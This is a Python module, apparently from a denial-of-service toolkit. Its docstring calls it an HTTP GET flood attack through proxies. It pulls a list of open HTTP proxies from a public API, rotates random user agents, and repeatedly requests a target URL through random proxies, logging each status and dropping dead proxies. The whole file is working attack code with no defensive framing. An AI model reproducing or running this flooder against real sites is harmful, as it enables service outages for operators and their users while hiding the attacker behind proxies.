"""This module provides the flood function for an HTTP GET request DoS attack through proxies."""

import json
import random
import sys
import warnings
from typing import Dict, List

import requests
from colorama import Fore
from requests.exceptions import Timeout

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]


def get_http_proxies() -> List[Dict[str, str]]:
    """Return a dictionary of avaliable proxies using http protocol.

    Args:
        None

    Returns:
        - proxies - A dictionary containing http proxies in the form of address:port paired values
    """
    try:
        with requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            verify=False,
        ) as proxy_list:
            proxies: List[Dict[str, str]]
            proxies = []
            for proxy in proxy_list.text.split("\r\n"):
                if proxy != "":
                    proxies.append({"http": proxy, "https": proxy})
    except Timeout:
        print(
            f"\n{Fore.RED}[!] {Fore.CYAN}It was not possible to connect to the proxies.{Fore.RESET}"
        )
        sys.exit(1)

    return proxies


headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

proxies = get_http_proxies()
color_code = {True: Fore.GREEN, False: Fore.RED}


def flood(target: str) -> None:
    """Start an HTTP GET request flood through proxies.

    Args:
        - target - Target's URL

    Returns:
        None
    """
    global proxies
    global headers

    headers["User-agent"] = random.choice(user_agents)

    try:
        proxy = random.choice(proxies)
        response = requests.get(target, headers=headers, proxies=proxy, timeout=4)
    except (Timeout, OSError):
        return
    else:
        status = (
            f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
        )
        payload_size = f"{Fore.RESET} Requested Data Size: {Fore.CYAN}{round(len(response.content)/1024, 2):>6} KB"
        proxy_addr = f"| {Fore.RESET}Proxy: {Fore.CYAN}{proxy['http']:>21}"
        print(
            f"{status}{Fore.RESET} --> {payload_size} {Fore.RESET}{proxy_addr}{Fore.RESET}"
        )
        if not response.status_code:
            try:
                proxies.remove(proxy)
            except ValueError:
                proxies = get_http_proxies()
